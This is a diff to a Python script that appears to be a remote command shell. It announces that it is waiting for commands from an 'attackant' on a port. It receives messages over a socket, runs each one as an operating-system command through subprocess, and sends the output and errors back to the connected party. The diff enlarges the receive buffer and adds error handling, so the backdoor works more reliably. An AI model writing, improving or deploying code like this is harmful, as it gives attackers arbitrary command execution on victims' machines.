@@ -12,16 +12,24 @@ print("I am waiting command of attackant on port {}".format(port))
 
 msg_recu = b""
 while msg_recu != b"end":
-    msg_recu = connexion_avec_serveur.recv(5024)
+    msg_recu = connexion_avec_serveur.recv(10024)
     msg=msg_recu.decode()
     print(msg)
     args = shlex.split(msg)
-    process = subprocess.Popen(args, stdout=subprocess.PIPE)
-    
-    stdout = process.communicate()
-    print(stdout)
-    stdout=stdout[0]
-    connexion_avec_serveur.send(stdout)
+    try:
+        process = subprocess.Popen(args, stdout=subprocess.PIPE,
+                                   stderr=subprocess.PIPE,
+                                   encoding="latin")
+        
+        
+        stdout = process.stdout.read()
+        stderr = process.stderr.read()
+        
+        data=str(stdout)+";;;"+str(stderr)
+        print(data)
+        connexion_avec_serveur.send(data.encode())
+    except:
+        connexion_avec_serveur.send("Error".encode())
 
 
 print("Bye Bye")
